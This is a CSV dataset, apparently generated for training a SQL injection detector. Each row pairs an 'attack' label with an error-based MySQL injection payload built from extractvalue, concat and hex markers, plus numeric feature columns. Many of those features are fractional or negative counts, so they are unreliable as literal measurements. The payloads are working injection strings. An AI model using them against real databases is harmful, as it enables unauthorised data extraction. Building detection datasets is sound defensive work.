id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000011,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",nearest_attack_euclidean,R000153,3.818756324261515,170.61061096191406,46.25859069824219,34.76472854614258,67.14055633544922,-0.2239869087934494,48.69907760620117,23.70626449584961,0.8117542266845703,0.25559201836586,0.21254132688045502,0.3869975209236145,0.12813512980937958,3.7133026123046875,1.2545260190963745,1.1564419269561768,0.5047468543052673,0.14431491494178772,0.048614755272865295,0.09141398221254349,6.141902923583984,6.470427989959717,4.935070514678955,0.03800767660140991,1.2684834003448486,0.2751176953315735,-0.1293754279613495,-0.0521569699048996,0.10627735406160355,0.2407551407814026,-0.05413161218166351,-0.267844021320343,2.821629762649536,0.1326589435338974,0.4030671715736389,1.416525959968567,4.5812530517578125,0.9431494474411011,1.2139321565628052,-0.20624464750289917,0.37370142340660095,0.1907787173986435,-0.05305472016334534,0.22595423460006714,0.06750328093767166,-0.14278843998908997,0.04867565631866455,0.017396463081240654,0.07546880841255188,0.09759756177663803,-0.03917715325951576,-0.006685206200927496,0.13829754292964935,0.036810487508773804,-0.16651464998722076,0.00023936480283737183,0.12705649435520172,0.012864071875810623,0.009464845061302185,0.1554422527551651,-0.04873586818575859,0.0012418702244758606,0.027468472719192505,0.04663838818669319,0.032399166375398636,-0.03632739931344986,0.9391863346099854,0.13385069370269775,0.20067918300628662,0.14660687744617462,-0.16578277945518494,-0.11140536516904831,0.1897258758544922,0.13833174109458923,0.015858611091971397,-0.13079215586185455,1.2346571683883667,0.32270383834838867,-0.15583020448684692,0.03186871111392975,0.15611514449119568,4.131076812744141,0.7066417336463928,0.1709153652191162,0.18584592640399933,0.9167928695678711,0.21562078595161438,0.12144998461008072,0.17320682108402252
GAN_000012,attack,error,"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""rfpq""  =  ""rfpq",nearest_attack_euclidean,R000061,4.266380854282566,171.65089416503906,44.080848693847656,35.61590576171875,66.88239288330078,-0.19193772971630096,49.424041748046875,24.432449340820312,1.1006654500961304,0.2417673021554947,0.20667339861392975,0.39592495560646057,0.12926346063613892,3.682706832885742,1.2175374031066895,1.784347653388977,0.7193285822868347,0.1940813511610031,0.03353729099035263,0.03265014663338661,6.308273792266846,6.42686128616333,4.76704740524292,0.0828964039683342,1.3392589092254639,0.38839492201805115,0.06739601492881775,-0.08987198770046234,0.09971963614225388,0.29729214310646057,-0.1118832379579544,-0.11623340100049973,2.735914945602417,0.2730741798877716,0.3368939757347107,1.5296852588653564,4.425296783447266,0.5440126657485962,1.2831981182098389,-0.19478347897529602,0.46034881472587585,0.26925182342529297,0.11284434795379639,0.19621509313583374,0.35696861147880554,-0.18909940123558044,-0.2658478319644928,0.07368943095207214,0.04403778165578842,0.10179850459098816,-0.06705234944820404,0.05568810924887657,-0.11793219298124313,0.3020252585411072,-0.1483004093170166,-0.0811656266450882,0.23167167603969574,0.14906133711338043,-0.010679371654987335,-0.11491131782531738,0.12832917273044586,0.2229885756969452,-0.26307815313339233,-0.06802421808242798,0.06317559629678726,-0.0834573432803154,0.9556691646575928,0.29430481791496277,0.21450109779834747,0.13358668982982635,-0.201076477766037,-0.23600225150585175,-0.031427331268787384,0.22642919421195984,0.02876327745616436,0.14436370134353638,1.1900166273117065,0.1317136585712433,-0.21593013405799866,-0.04490264505147934,0.07471580803394318,4.185971260070801,0.7150911688804626,0.19414231181144714,-0.017383554950356483,0.8955793380737305,0.055976852774620056,0.3308940827846527,-0.0021561086177825928
GAN_000013,attack,error,"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'lbwh'  =  'lbwh",nearest_attack_euclidean,R000239,3.7014818877740923,171.16476440429688,45.54018783569336,35.14903259277344,65.89140319824219,0.2712097465991974,48.38806915283203,23.035301208496094,1.08109450340271,0.27142730355262756,0.2108062356710434,0.3915248215198517,0.12814030051231384,3.708101272583008,0.8718555569648743,1.011082410812378,0.47344809770584106,0.15898731350898743,0.018259573727846146,0.04138968884944916,6.124531269073486,6.50115966796875,4.7378153800964355,0.12891638278961182,1.4031212329864502,0.19588713347911835,-0.06336667388677597,0.22515954077243805,0.07889486104249954,0.1476183980703354,0.03947940468788147,-0.14022330939769745,2.7586939334869385,-0.048491042107343674,0.32887718081474304,1.5114046335220337,4.628742694854736,0.9928924441337585,1.217500925064087,-0.02044542506337166,0.2866322696208954,0.18444223701953888,0.057704269886016846,0.23339462280273438,0.07326396554708481,-0.1222800686955452,-0.18664902448654175,0.05575384944677353,0.039708495140075684,0.0486580990254879,0.004909923765808344,-0.0039091273210942745,-0.1640779972076416,0.0949963852763176,-0.003802371211349964,0.03651438653469086,0.081146739423275,0.08812196552753448,-0.12902796268463135,0.09298835694789886,0.03726007044315338,-0.03298002853989601,-0.07805141061544418,0.07605551183223724,0.07046013325452805,-0.03438306599855423,0.970651388168335,0.03518899530172348,0.05481512099504471,0.01777976006269455,0.15261152386665344,-0.09552191197872162,0.053715627640485764,-0.03603506088256836,0.015811702236533165,0.0751170814037323,0.9998011589050293,0.3821965157985687,0.015472859144210815,0.13269241154193878,0.05804585665464401,4.253198623657227,0.5272806882858276,0.15753015875816345,0.19182173907756805,0.9031669497489929,-0.07778614014387131,-0.13707515597343445,-0.10533690452575684
GAN_000014,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",nearest_attack_euclidean,R000153,4.0002725824777645,169.93655395507812,45.44700241088867,35.61991882324219,66.75016021728516,0.26676517724990845,48.635772705078125,23.941232681274414,1.1081182956695557,0.25388121604919434,0.2079823613166809,0.3909193277359009,0.12840178608894348,3.6827847957611084,1.113331913948059,1.322833776473999,0.6838393211364746,0.1811821609735489,0.0402502566576004,-0.02795671485364437,6.099202632904053,6.478652000427246,4.748402118682861,0.15771162509918213,1.3123891353607178,0.25744926929473877,0.018316101282835007,0.0685335248708725,0.10375656932592392,0.25358015298843384,-0.01642289012670517,-0.0757652074098587,2.7533788681030273,0.2031075358390808,0.38101568818092346,1.5166984796524048,4.533514022827148,0.6477506756782532,1.1552613973617554,-0.20783567428588867,0.4022040069103241,0.21635976433753967,0.0754939615726471,0.19132116436958313,0.14769932627677917,-0.09098786860704422,-0.17380301654338837,0.02489577978849411,0.0526023767888546,0.06393715739250183,-0.07562623918056488,0.021237393841147423,-0.06381572037935257,0.20431813597679138,-0.09762480109930038,-0.013479046523571014,0.21480703353881836,0.1447000950574875,-0.07078009098768234,-0.04968992620706558,0.08188115060329437,0.0910487100481987,-0.09455344825983047,0.011612474918365479,0.05446256697177887,-0.023482462391257286,0.9728423953056335,0.08975095301866531,0.11510445922613144,0.08113521337509155,-0.11670561879873276,-0.20597565174102783,-0.03581000864505768,0.23497331142425537,0.011957223527133465,0.10459493100643158,1.2266768217086792,0.21895655989646912,-0.09933943301439285,0.018456406891345978,-0.059891797602176666,4.2549262046813965,0.5855876803398132,0.09369542449712753,0.08534803241491318,0.8953058123588562,0.029139108955860138,0.20687538385391235,-0.09698932617902756
GAN_000015,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",nearest_attack_euclidean,R000153,3.9808283575089916,169.52651977539062,45.09251022338867,35.36423873901367,66.64897155761719,0.32558301091194153,49.28746032714844,24.02638053894043,1.1743357181549072,0.2472265213727951,0.212956041097641,0.3853139281272888,0.12919162213802338,3.6932320594787598,1.1906787157058716,0.9957430362701416,0.5380485653877258,0.1489517241716385,0.021237336099147797,0.2035660296678543,5.988850116729736,6.515128135681152,4.894630432128906,0.01757992058992386,1.2956161499023438,0.16606952250003815,-0.29616084694862366,0.07577282190322876,0.0062082745134830475,0.21650592982769012,-0.05491498112678528,-0.0016551613807678223,2.7539498805999756,0.33595573902130127,0.464273601770401,1.4143943786621094,4.5121541023254395,0.5461311340332031,1.039911150932312,-0.12727321684360504,0.3307107388973236,0.29100650548934937,-0.13463464379310608,0.13194653391838074,0.01056506484746933,0.10084492713212967,-0.21688221395015717,0.026492202654480934,0.05515185371041298,0.04724006727337837,-0.0798320546746254,0.019343754276633263,-0.11377773433923721,0.041184283792972565,-0.04324270784854889,-0.0440952330827713,-0.019609030336141586,0.11019553244113922,0.11602848768234253,-0.10752351582050323,-0.04793263226747513,0.3588089346885681,0.04491240531206131,0.09389911592006683,0.035876158624887466,-0.13801978528499603,0.9617125391960144,0.0840643122792244,0.2927533984184265,-0.007568001747131348,-0.08497440069913864,-0.11759350448846817,0.09119489789009094,0.34744858741760254,0.00949014164507389,0.06049966812133789,1.216786503791809,0.2189408540725708,-0.1765347719192505,-0.04261762648820877,0.04719411954283714,4.1827898025512695,0.6905454993247986,0.31236597895622253,0.0301633533090353,0.8457780480384827,-0.021945569664239883,0.4011884033679962,-0.13466407358646393
GAN_000016,attack,error,"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'lbwh'  =  'lbwh",nearest_attack_euclidean,R000239,3.8703295251327527,170.85043334960938,44.39423370361328,34.96568298339844,65.06292724609375,0.6925867199897766,49.94290542602539,23.44548988342285,0.9740874171257019,0.2597174048423767,0.20878387987613678,0.38374388217926025,0.1280057430267334,3.695333242416382,0.7993729114532471,0.8484975099563599,0.45046526193618774,0.12794426083564758,0.0025246713776141405,-0.04635121300816536,6.0621562004089355,6.508095741271973,4.513774871826172,0.1881560981273651,1.4047876596450806,0.24359938502311707,-0.09021427482366562,0.26893606781959534,0.057570986449718475,0.16225427389144897,-0.045908235013484955,-0.14646688103675842,2.7641241550445557,0.005365464836359024,0.32279276847839355,1.5695812702178955,4.6163506507873535,0.912926435470581,1.0705701112747192,-0.12346258759498596,0.34970322251319885,0.24695293605327606,0.14572638273239136,0.1788603514432907,0.24479755759239197,-0.050004102289676666,-0.10754143446683884,0.04127158969640732,0.03998904302716255,0.04359617829322815,-0.014182006940245628,0.011583862826228142,-0.17367789149284363,0.1686151623725891,0.08585190027952194,-0.038946524262428284,-0.013535652309656143,0.10568352043628693,-0.11446872353553772,0.2261236608028412,0.053412795066833496,-0.04388531297445297,-0.10339035838842392,0.1505928784608841,0.07443035393953323,0.06374488025903702,0.9662655591964722,-0.03677906095981598,0.061838120222091675,-0.06902393698692322,0.07336651533842087,-0.17327024042606354,0.008698254823684692,-0.05813814699649811,0.004625750705599785,0.15104341506958008,1.037137508392334,0.3010323941707611,-0.11502625793218613,0.13359501957893372,0.1309894472360611,4.3458333015441895,0.5412368178367615,0.2757432162761688,0.1822219043970108,0.8447644710540771,-0.19281917810440063,-0.14052003622055054,0.026784464716911316
GAN_000017,attack,error,"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'lbwh'  =  'lbwh",nearest_attack_euclidean,R000239,3.8041526644439907,171.65647888183594,46.17923355102539,35.1068229675293,64.94519805908203,-0.38344234228134155,47.755062103271484,23.89910888671875,1.306879997253418,0.25971803069114685,0.21641185879707336,0.3916352093219757,0.12828028202056885,3.6870205402374268,1.046939492225647,1.1626429557800293,0.6049669981002808,0.14686216413974762,0.026060499250888824,-0.014283091761171818,6.308685779571533,6.405600070953369,4.806822776794434,-0.06216534227132797,1.3055124282836914,0.14208081364631653,0.019880373030900955,0.08790062367916107,0.022127743810415268,0.19679991900920868,-0.07112352550029755,-0.07256901264190674,2.766207456588745,0.07925226539373398,0.4421328902244568,1.5566586256027222,4.6226115226745605,0.9270060062408447,1.2818938493728638,-0.06051557511091232,0.3393999934196472,0.13498179614543915,-0.012500286102294922,0.1822565793991089,0.0050071850419044495,-0.0579911544919014,-0.13996557891368866,0.03909274563193321,0.06379349529743195,0.04708094522356987,-0.07911282032728195,-0.020988179370760918,-0.15239828824996948,0.08568275719881058,-0.0656457245349884,-0.0959002673625946,0.16249433159828186,0.026258941739797592,-0.06462505459785461,0.2127213180065155,-0.04077150672674179,-0.06214335560798645,-0.130182683467865,0.1639525294303894,0.07425563782453537,-0.06183537095785141,1.009885549545288,-0.07893528789281845,0.07229666411876678,0.0008055567741394043,0.1826462298631668,-0.13081547617912292,0.16633880138397217,0.10604440420866013,0.026860663667321205,-0.07006976008415222,1.0949424505233765,0.4163271486759186,-0.19141489267349243,0.06329444795846939,0.018637940287590027,4.0093278884887695,0.6260586977005005,0.25379839539527893,0.17446844279766083,0.9271541833877563,0.08953668177127838,-0.1214725598692894,-0.08795119822025299
GAN_000018,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",nearest_attack_euclidean,R000153,4.058406414484747,169.6190948486328,44.70412826538086,33.74306106567383,63.03693771362305,0.5065420269966125,50.14470291137695,24.28366470336914,0.9607952237129211,0.2509513199329376,0.21223247051239014,0.38430964946746826,0.12871885299682617,3.6790432929992676,0.6814438104629517,0.8806297779083252,0.41844233870506287,0.12088648229837418,0.01336961891502142,0.053469281643629074,6.181912899017334,6.284947395324707,4.428318500518799,0.15912333130836487,1.2802329063415527,0.29644063115119934,-0.05416228622198105,0.16036994755268097,0.005963455885648727,0.16010421514511108,-0.1450052261352539,-0.15584202110767365,2.730562210083008,0.07370239496231079,0.3412145972251892,1.6251906156539917,4.589192867279053,0.8131360411643982,1.1385184526443481,-0.14070406556129456,0.3856322169303894,0.2932182252407074,0.08960022777318954,0.1236724853515625,0.35449129343032837,-0.1628861129283905,-0.11405988037586212,0.05738431587815285,0.03368464484810829,0.052004750818014145,-0.03603748604655266,-0.011771680787205696,-0.32517847418785095,0.25186827778816223,0.09804634749889374,-0.2275635451078415,0.013843502849340439,0.12404896318912506,-0.08615231513977051,0.4726921319961548,0.04634767770767212,-0.006751019507646561,-0.2686941623687744,0.2589291036128998,0.11575519293546677,0.09631210565567017,0.9663532972335815,0.011542603373527527,0.105322927236557,-0.2231295108795166,0.12984436750411987,-0.2548421025276184,0.06491031497716904,-0.044977933168411255,0.01491157989948988,0.09237811714410782,1.0655300617218018,0.21773774921894073,-0.1974143087863922,0.09752406924962997,0.13728153705596924,4.240124702453613,0.6643666625022888,0.36014753580093384,0.11326472461223602,0.9138795137405396,-0.0458977110683918,-0.17225316166877747,0.027489930391311646
GAN_000019,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",nearest_attack_euclidean,R000153,3.8840275490830822,169.74085998535156,43.422019958496094,35.25821304321289,66.41743469238281,-0.4036230444908142,50.436378479003906,23.778736114501953,0.8358957171440125,0.25398892164230347,0.20980745553970337,0.3868007957935333,0.12984558939933777,3.7134172916412354,1.1356736421585083,1.0012502670288086,0.40638840198516846,0.13446952402591705,0.03034110553562641,0.216120645403862,6.120477676391602,6.503848552703857,4.8463239669799805,0.06309067457914352,1.2632954120635986,0.24013745784759521,-0.15091392397880554,-0.0038813191931694746,0.08432461321353912,0.24152055382728577,-0.061144426465034485,-0.35777828097343445,2.7708897590637207,0.18303555250167847,0.3220615088939667,1.4662351608276367,4.5806355476379395,0.8227869272232056,1.136291742324829,-0.16186285018920898,0.3806515634059906,0.24358421564102173,-0.01145123690366745,0.1731904149055481,0.2941606938838959,-0.14949893951416016,-0.053017161786556244,0.06196103245019913,0.07939357310533524,0.09461860358715057,-0.013870691880583763,-0.01954273320734501,-0.018053606152534485,0.0063082873821258545,-0.15644824504852295,-0.13359065353870392,0.05983123555779457,0.1462978720664978,-0.17898356914520264,0.3053584098815918,-0.02928304672241211,0.1268625557422638,-0.13680881261825562,-0.006168980151414871,0.06124258413910866,0.12530632317066193,0.9126741886138916,0.2508449852466583,0.1840057522058487,0.026704110205173492,-0.19766473770141602,-0.17467325925827026,0.19084671139717102,0.03114210069179535,0.01900898851454258,-0.050169847905635834,1.1475456953048706,0.19865983724594116,-0.1835717260837555,0.10580136626958847,0.05499034747481346,4.149519920349121,0.7551897168159485,0.2937595546245575,0.04003668576478958,0.875987708568573,0.08974430710077286,0.10299462825059891,0.0700201541185379
GAN_000020,attack,error,"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""rfpq""  =  ""rfpq",nearest_attack_euclidean,R000061,4.2299489459690935,168.1570281982422,44.2805061340332,34.34511947631836,66.12169647216797,0.055498525500297546,50.12684631347656,24.46022605895996,0.8274745941162109,0.24274298548698425,0.2113729566335678,0.39066532254219055,0.12825895845890045,3.719904899597168,1.0543183088302612,1.361892819404602,0.5146178007125854,0.1576971411705017,0.05749429762363434,0.057503338903188705,6.1903605461120605,6.5890045166015625,4.794180393218994,0.02487381547689438,1.265536904335022,0.4299270212650299,-0.13116708397865295,-0.07975135743618011,0.10383962094783783,0.30956754088401794,-0.11943979561328888,-0.24775218963623047,2.75158429145813,0.152084618806839,0.42647773027420044,1.4882354736328125,4.5389251708984375,0.6438775062561035,1.1842256784439087,-0.33549052476882935,0.4780796468257904,0.26378560066223145,-0.0317782461643219,0.16946721076965332,0.2016473114490509,-0.08443024009466171,-0.0045260414481163025,0.04359470307826996,0.10850289463996887,0.1177428811788559,-0.0808376893401146,-0.010954642668366432,0.12449552118778229,0.16430392861366272,-0.09582481533288956,-0.06682740151882172,0.03988002985715866,0.055922556668519974,0.017390429973602295,0.09740572422742844,0.1297752559185028,0.18673920631408691,-0.1474093794822693,0.02956351265311241,0.033241067081689835,-0.09670539200305939,0.9252391457557678,0.2720755636692047,0.26404470205307007,0.07686029374599457,-0.3002764880657196,-0.16899055242538452,0.22437772154808044,0.21738865971565247,0.008287258446216583,-0.17903360724449158,1.3452168703079224,0.18696261942386627,-0.2880859673023224,-0.025429897010326385,0.08713597059249878,4.141145706176758,0.7716895341873169,0.10989244282245636,0.08127199858427048,0.8964405655860901,0.2175675630569458,0.35863885283470154,0.1415148824453354
GAN_000021,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",nearest_attack_euclidean,R000153,4.206238762191029,167.1476593017578,43.40009689331055,34.802616119384766,65.97270202636719,0.12043772637844086,51.08486557006836,24.852025985717773,0.7323517799377441,0.2388778030872345,0.21536768972873688,0.38846448063850403,0.1279018670320511,3.7047677040100098,1.1134917736053467,1.1557283401489258,0.47714298963546753,0.19154781103134155,0.035610444843769073,0.10645539313554764,6.226717948913574,6.599609851837158,4.811111927032471,0.06013086438179016,1.2421674728393555,0.4785260260105133,-0.21075576543807983,-0.07563145458698273,0.09214449673891068,0.30697694420814514,-0.19729450345039368,-0.3056873083114624,2.823547124862671,0.12406404316425323,0.39011138677597046,1.5889339447021484,4.60078763961792,0.7205737233161926,1.1982088088989258,-0.35466623306274414,0.4962758421897888,0.2760675251483917,0.01940373331308365,0.17008967697620392,0.3831770718097687,-0.11701605468988419,0.11494287848472595,0.03244950622320175,0.10177633166313171,0.12459881603717804,-0.08820207417011261,-0.03467543050646782,0.22493958473205566,0.11061982065439224,-0.10808097571134567,-0.11649815738201141,0.10741899162530899,0.07137703895568848,-0.042673587799072266,0.17338311672210693,0.14403791725635529,0.036164551973342896,-0.1258421242237091,0.09913098812103271,0.041306689381599426,-0.021715037524700165,0.9288897514343262,0.16621586680412292,0.22691406309604645,0.051742490381002426,-0.3903639018535614,-0.16237646341323853,0.20115041732788086,0.2029067575931549,0.0089622987434268,-0.14716662466526031,1.4473850727081299,0.19156472384929657,-0.3132059574127197,0.02497643232345581,0.17420226335525513,4.313990116119385,0.7747463583946228,0.21694239974021912,0.07927825301885605,0.876957893371582,0.20159173011779785,0.29362544417381287,0.253750205039978
GAN_000022,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",nearest_attack_euclidean,R000153,4.184102729294726,169.1165313720703,45.68712615966797,34.5161247253418,67.5137710571289,0.13101474940776825,48.970985412597656,24.18389320373535,1.0675511360168457,0.2496785968542099,0.20254933834075928,0.3886449933052063,0.12905268371105194,3.699004650115967,1.3314937353134155,1.3392795324325562,0.5978941917419434,0.11221353709697723,0.0187999214977026,0.13733620941638947,6.317538261413574,6.393199443817139,4.98393440246582,0.08650234341621399,1.2516909837722778,0.1679057627916336,0.043442320078611374,0.027081729844212532,0.0002622046449687332,0.26391059160232544,-0.201054185628891,-0.09916073828935623,2.7441484928131104,0.28573864698410034,0.4209265112876892,1.4238468408584595,4.427815914154053,0.48487892746925354,1.213200330734253,-0.14944736659526825,0.4981880486011505,0.30772852897644043,0.09725837409496307,0.13576911389827728,0.2573147416114807,0.021960578858852386,-0.24471881985664368,0.047259069979190826,0.04981511831283569,0.08789847046136856,-0.09267891943454742,0.05250219255685806,0.015833880752325058,0.09523173421621323,-0.036567434668540955,-0.29413747787475586,0.14266639947891235,-0.08919546008110046,0.11836723983287811,0.12610463798046112,-0.016545727849006653,0.2734433114528656,-0.14192664623260498,-0.04275211691856384,0.04809693619608879,0.0873086005449295,0.949372410774231,0.15656960010528564,0.23789620399475098,-0.07846392691135406,-0.2095750868320465,-0.2837222218513489,0.04223603755235672,0.14828096330165863,0.011539782397449017,0.038593560457229614,1.1551239490509033,0.14531925320625305,-0.2901992201805115,-0.040164701640605927,-0.02792615443468094,4.147934436798096,0.7216843366622925,0.1443260908126831,-0.02017931081354618,0.8834850192070007,-0.06769242882728577,0.36336836218833923,0.0067461952567100525
GAN_000023,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",nearest_attack_euclidean,R000153,3.7807013324779053,170.78208923339844,46.22761535644531,35.161006927490234,67.2532730102539,-0.913959801197052,48.353939056396484,23.965166091918945,0.9181861877441406,0.2609676420688629,0.2089279741048813,0.38738396763801575,0.12936198711395264,3.6908020973205566,1.3514585494995117,1.204469919204712,0.6136396527290344,0.11521285027265549,0.046661682426929474,0.1691640466451645,6.245658874511719,6.48932409286499,5.110401630401611,-0.004220463335514069,1.2658913135528564,0.14514823257923126,-0.09004919230937958,0.013776437379419804,0.04819061607122421,0.23268885910511017,-0.1753140091896057,-0.2733657956123352,2.778169870376587,0.18172669410705566,0.4388487637042999,1.5381306409835815,4.574585437774658,0.9612582325935364,1.2767751216888428,-0.192518413066864,0.38286468386650085,0.17145873606204987,-0.1089569479227066,0.204558864235878,0.12471022456884384,-0.040909625589847565,-0.05273248255252838,0.04642030596733093,0.07480133324861526,0.07806172221899033,-0.06125373765826225,0.013403287157416344,-0.09106651693582535,0.0011245831847190857,-0.18965469300746918,-0.12592177093029022,0.18275576829910278,0.03081069514155388,-0.0742567628622055,0.34118831157684326,0.02126871794462204,0.11340630799531937,-0.1228378638625145,0.11282122135162354,0.04682799428701401,0.021619610488414764,0.9638944268226624,0.08737843483686447,0.10835377871990204,0.12924042344093323,-0.033393725752830505,-0.19000816345214844,0.1958622932434082,0.008915774524211884,0.020574776455760002,-0.15525904297828674,1.1907193660736084,0.31156712770462036,-0.15058308839797974,0.03301171958446503,-0.09366896003484726,3.9915060997009277,0.7199487686157227,0.23690861463546753,0.11518498510122299,0.9317651391029358,0.04944884032011032,0.1275731921195984,0.030565232038497925
